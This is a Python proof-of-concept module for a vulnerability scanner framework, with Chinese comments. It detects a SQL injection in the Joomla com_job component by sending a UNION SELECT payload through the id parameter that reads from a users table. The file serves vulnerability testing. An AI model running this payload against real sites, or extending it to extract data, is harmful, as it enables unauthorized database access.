# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0039'  # 平台漏洞编号
    # 漏洞名称
    name = 'Joomla Component com_job (showMoreUse) SQL injection vulnerability'
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        Joomla! Component com_job 组件'index.php' SQL注入漏洞
        Joomla! Component com_job 组件的index.php中存在SQL注入漏洞。
        远程攻击者可以借助一个option操作中的id参数，执行任意SQL指令。。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-67141'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'de202c7f-fb0b-483d-b386-a65141e62cbb'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/index.php?option=com_job&task=showMoreUser&id=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,%s,17,18,19,20,21,22,23,24,25+from+kew_users--'
            payload = payload % 'md5(1)'
            vul_url = '%s%s' % (arg, payload)
            res = requests.get(vul_url, timeout=10)
            if 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
